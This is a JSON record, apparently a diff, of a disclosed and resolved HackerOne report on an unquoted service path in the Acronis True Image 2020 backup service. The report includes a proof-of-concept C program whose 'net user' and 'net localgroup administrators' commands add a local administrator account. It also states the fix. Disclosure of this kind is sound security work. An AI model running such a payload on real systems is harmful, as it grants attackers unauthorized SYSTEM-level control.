@@ -1,0 +1,137 @@
+{
+  "id": 1083532,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDgzNTMy",
+  "url": "https://hackerone.com/reports/1083532",
+  "title": "Acronis True Image 2020 Build 22510 Nonstop Backup Service Unquoted service path (privilege escalation)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2021-01-21T20:01:36.260Z",
+  "submitted_at": "2021-01-21T20:01:36.524Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sanderz31",
+    "url": "/sanderz31",
+    "profile_picture_urls": {
+      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTMyNDQ4MCwicHVyIjoiYmxvYl9pZCJ9fQ==--59329440c0a3e24079483cbfaaa4640a64a11c76/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/south-park-warcraft.jpg"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13428,
+    "url": "https://hackerone.com/acronis",
+    "handle": "acronis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Acronis",
+      "twitter_handle": "Acronis",
+      "website": "https://www.acronis.com",
+      "about": "Complete integrated cybersecurity and data protection for MSPs and IT teams"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-08-27T13:49:17.257Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-06-22T06:40:24.796Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nAcronis True Image 2020 Nonstop Backup Service is created with an executable path that contains spaces and isn't enclosed within quotes this leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges.\n\nSee screenshot below.\n\n {F1166932} {F1166937}\n\n## POC\n\nThe vunability can be easily exploited by placing a custom executable C:\\Program Files (x86)\\Common.exe or C:\\Program.exe and restarting the computer/service. The executable will be executed with system privileges.\n\nAn example code for such application can be creating a new user with Administrator privilegles.\n\n```C\n#include <stdlib.h>\n// i686-w64-mingw32-gcc adduser.c -o adduser.exe\nint main ()\n{\nint i;\ni = system (\"net user username P@ssword! /add\");\ni = system (\"net localgroup administrators username /add\");\nreturn 0;\n}\n```\n\n## Recommendations\nAdd quotes to the path \"C:\\Program Files (x86)\\Common Files\\Acronis\\CDP\\afcdpsrv.exe\" instead of C:\\Program Files (x86)\\Common Files\\Acronis\\CDP\\afcdpsrv.exe\n\n## Impact\n\nprivilege escalation on the affected system.",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1166932,
+      "file_name": "acronis_service.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5rtt2s75xhn53w09taq4eicdrtgt?response-content-disposition=attachment%3B%20filename%3D%22acronis_service.png%22%3B%20filename%2A%3DUTF-8%27%27acronis_service.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2S4DOCAB%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T181604Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQCGrqLhmmndM0FT97FmABsmwLW3EimxExNLZQ8MykAy7gIhALjjpbUXmgxTm0u94NNceKLYV2jMHuQa7L92zBlF6JudKrsFCPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzjIl5ihPzsGg%2Fa%2BIoqjwVnd0C84jKhgHqIgpQyWcPQoQ5SV%2Fa27wkzR08%2BQ4DH47sJg5QNUdq7Wkulb9ygXgX7%2FUMFSAHxn1gCy%2FfCA16dmg2ZZE63uQ8nPHzyabPQq9NvC1O3Pp9ZQ1Y0rhpXBFZ1LY9DDr8WZFRK4YOxNJeu0%2BXSQKx60XxU1AoiPgjzgwdYg90G4oac8J91vQ0ePnZbcnHSMVE4EzRAIy4yggrP6OYPoWd1SCFyRqgyyRjeX77Pp9ebQUVPwzgBoGKb4GmHigNAOtPpikfCsj9RCIFyu0s%2B66NGzbDLyxN1dHX%2FrHISn4GjfTkjtZA2bLdbnaVT5gVS2rdPGQ%2Fq6WWV%2BdU2oGaGBeHHwupcgwcRKT9gqCcy4ujFRbDXsHcpM2XoatV9O1EzmlhChkiivB3jodi1Aqt004ilBIKgm%2F2HRJniShyqmvF%2BrwAfJdCLE3h%2FtPmNz4KzyACp%2BguCDoE7sTgwnDBlYtc9J8T7WGIWBf3WqAI75lZhGeKVs1b%2BFJ%2BSO3LPquhMxufkt4DlgBVAsnAmXXclpnrT1PYT079cTcPiSAzg5oCyKAXOcMiZeHNL5r00G1Yrm0gvidV43E0poj0OZf8E08HvxFjVP3Fp%2FML%2F4qqIBvAwjm8tJg%2BaG7WbH7%2BLbU1rL4v8Dy4tNt5jPg5aPooKLEd0nlqKhgL8BKYoEZ%2Ba7325MQ404To2486g03G01MMYPex9zVPck2syqiIxvYAclPVoKqlBYNXEkad6bEEYysYNAYxo4YjsLvc%2Bwc0xrNAhmWS2DjGvHyxRzy%2Fv7EhxKC5UbGVRCz97Tubx05J1BHwHG5lmJ%2BrVZx5leenbNEn6eCIFlqINATuNK0a%2B4ssqXnM5SpOcSQrcUsZqMJ%2BEu8YGOrAB%2F4BE4ZFApcUNdyhP4IQARULLJxOH56Lxr%2FqbypBCpl%2Fyg3GXb0rVtOntQ6XPvhYmCRd7bWlM0lFaYq11TF8JhorwomowOhrl%2B3dtGQB0eX3MwecxPDNQfKXoO%2B0U3IQMvQyG25fu6oDRpmV1v%2Bq82zit8xVmnqdRF4hx5PaC2kCdBdtpjTz13Ptq8SzAfbOes9auAJdT1LtRGmTmB6qIB3zJKlzXIr8wOFsDyHxvnrg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cb421c5e735aab69763679a72d6f7fa437315c5efd36b49983bf652e551cd9f2",
+      "file_size": 13701,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1166937,
+      "file_name": "acronis_exe_fileinfo.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fpp6g3w5pa0kacsp2ml13hpoghsm?response-content-disposition=attachment%3B%20filename%3D%22acronis_exe_fileinfo.png%22%3B%20filename%2A%3DUTF-8%27%27acronis_exe_fileinfo.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2S4DOCAB%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T181604Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQCGrqLhmmndM0FT97FmABsmwLW3EimxExNLZQ8MykAy7gIhALjjpbUXmgxTm0u94NNceKLYV2jMHuQa7L92zBlF6JudKrsFCPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzjIl5ihPzsGg%2Fa%2BIoqjwVnd0C84jKhgHqIgpQyWcPQoQ5SV%2Fa27wkzR08%2BQ4DH47sJg5QNUdq7Wkulb9ygXgX7%2FUMFSAHxn1gCy%2FfCA16dmg2ZZE63uQ8nPHzyabPQq9NvC1O3Pp9ZQ1Y0rhpXBFZ1LY9DDr8WZFRK4YOxNJeu0%2BXSQKx60XxU1AoiPgjzgwdYg90G4oac8J91vQ0ePnZbcnHSMVE4EzRAIy4yggrP6OYPoWd1SCFyRqgyyRjeX77Pp9ebQUVPwzgBoGKb4GmHigNAOtPpikfCsj9RCIFyu0s%2B66NGzbDLyxN1dHX%2FrHISn4GjfTkjtZA2bLdbnaVT5gVS2rdPGQ%2Fq6WWV%2BdU2oGaGBeHHwupcgwcRKT9gqCcy4ujFRbDXsHcpM2XoatV9O1EzmlhChkiivB3jodi1Aqt004ilBIKgm%2F2HRJniShyqmvF%2BrwAfJdCLE3h%2FtPmNz4KzyACp%2BguCDoE7sTgwnDBlYtc9J8T7WGIWBf3WqAI75lZhGeKVs1b%2BFJ%2BSO3LPquhMxufkt4DlgBVAsnAmXXclpnrT1PYT079cTcPiSAzg5oCyKAXOcMiZeHNL5r00G1Yrm0gvidV43E0poj0OZf8E08HvxFjVP3Fp%2FML%2F4qqIBvAwjm8tJg%2BaG7WbH7%2BLbU1rL4v8Dy4tNt5jPg5aPooKLEd0nlqKhgL8BKYoEZ%2Ba7325MQ404To2486g03G01MMYPex9zVPck2syqiIxvYAclPVoKqlBYNXEkad6bEEYysYNAYxo4YjsLvc%2Bwc0xrNAhmWS2DjGvHyxRzy%2Fv7EhxKC5UbGVRCz97Tubx05J1BHwHG5lmJ%2BrVZx5leenbNEn6eCIFlqINATuNK0a%2B4ssqXnM5SpOcSQrcUsZqMJ%2BEu8YGOrAB%2F4BE4ZFApcUNdyhP4IQARULLJxOH56Lxr%2FqbypBCpl%2Fyg3GXb0rVtOntQ6XPvhYmCRd7bWlM0lFaYq11TF8JhorwomowOhrl%2B3dtGQB0eX3MwecxPDNQfKXoO%2B0U3IQMvQyG25fu6oDRpmV1v%2Bq82zit8xVmnqdRF4hx5PaC2kCdBdtpjTz13Ptq8SzAfbOes9auAJdT1LtRGmTmB6qIB3zJKlzXIr8wOFsDyHxvnrg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=770f4acf35a527b0876f05bb81ac34bc6f459918da160998bd75cec9f205bddc",
+      "file_size": 15239,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 14,
+  "voters": [
+    "zy9ard3",
+    "ali",
+    "thalaivar304",
+    "mohaned0101",
+    "electricode",
+    "saurabhcsec",
+    "ship_sleep",
+    "shakav999",
+    "nytromg",
+    "aecherli",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 50772,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Acronis Cyber Protect Home Office (formerly Acronis True Image)",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
